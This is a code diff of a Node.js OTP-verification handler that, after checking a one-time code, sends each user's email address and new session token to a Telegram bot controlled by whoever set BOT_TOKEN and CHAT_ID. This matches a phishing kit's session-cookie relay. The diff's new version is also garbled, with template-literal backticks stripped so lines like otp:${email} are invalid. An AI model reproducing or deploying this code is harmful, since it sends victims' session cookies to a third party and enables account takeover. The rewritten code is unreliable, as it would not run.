@@ -1,6 +1,6 @@
-const Redis = require("ioredis");
-const { v4: uuidv4 } = require("uuid");
-const fetch = require("node-fetch");
+import Redis from "ioredis";
+import { v4 as uuidv4 } from "uuid";
+import fetch from "node-fetch";
 
 const REDIS_URL = process.env.REDIS_URL;
 const BOT_TOKEN = process.env.BOT_TOKEN;
@@ -10,7 +10,6 @@ if (!REDIS_URL || !BOT_TOKEN || !CHAT_ID) {
   throw new Error("Missing required environment variables: REDIS_URL, BOT_TOKEN, or CHAT_ID.");
 }
 
-// Create a single Redis instance (Vercel may re-use the Lambda)
 let redis;
 function getRedis() {
   if (!redis) {
@@ -20,11 +19,11 @@ function getRedis() {
 }
 
 function getOtpKey(email) {
-  return `otp:${email}`;
+  return otp:${email};
 }
 
 function getSessionKey(token) {
-  return `session:${token}`;
+  return session:${token};
 }
 
 const SESSION_TTL_SECONDS = 60 * 60 * 24 * 7; // 7 days
@@ -49,20 +48,18 @@ export default async function handler(req, res) {
   }
 
   email = email.trim().toLowerCase();
-
   const redisClient = getRedis();
 
   let storedOtp;
   try {
     storedOtp = await redisClient.get(getOtpKey(email));
   } catch (err) {
-    console.error("Redis error:", err);
-    res.status(500).json({ success: false, message: "Internal server error" });
+    res.status(500).json({ success: false, message: "Internal Redis error" });
     return;
   }
 
   if (!storedOtp) {
-    res.status(400).json({ success: false, message: "OTP not found" });
+    res.status(400).json({ success: false, message: "OTP not found or expired" });
     return;
   }
 
@@ -71,24 +68,22 @@ export default async function handler(req, res) {
     return;
   }
 
-  // Session creation
   const sessionToken = uuidv4();
   try {
     await redisClient.set(getSessionKey(sessionToken), email, "EX", SESSION_TTL_SECONDS);
   } catch (err) {
-    console.error("Redis session set error:", err);
-    res.status(500).json({ success: false, message: "Internal server error" });
+    res.status(500).json({ success: false, message: "Failed to create session" });
     return;
   }
 
-  // Send session/cookie to Telegram
-  const message =
-    `✅ *OTP Verified*\n\n` +
-    `📧 Email: ${email}\n` +
-    `🍪 Session: ${sessionToken}\n` +
-    `⏳ Valid for: 7 days`;
+  const message = [
+    "✅ OTP Verified",
+    📧 Email: ${email},
+    🍪 Session: ${sessionToken},
+    ⏳ Valid: 7 days,
+  ].join("\n");
 
-  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  const telegramUrl = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
 
   try {
     await fetch(telegramUrl, {
@@ -101,14 +96,13 @@ export default async function handler(req, res) {
       }),
     });
   } catch (e) {
-    // continue, but log error
-    console.error("Telegram session notify failed: ", e);
+    console.error("Telegram notify failed:", e);
   }
 
-  // Set cookie header (Vercel supports res.setHeader)
   res.setHeader(
     "Set-Cookie",
-    `session=${sessionToken}; Path=/; HttpOnly; SameSite=Strict; Max-Age=${SESSION_TTL_SECONDS}`
+    session=${sessionToken}; Path=/; HttpOnly; SameSite=Strict; Max-Age=${SESSION_TTL_SECONDS}
   );
+
   res.status(200).json({ success: true, message: "OTP verified and session created" });
 }
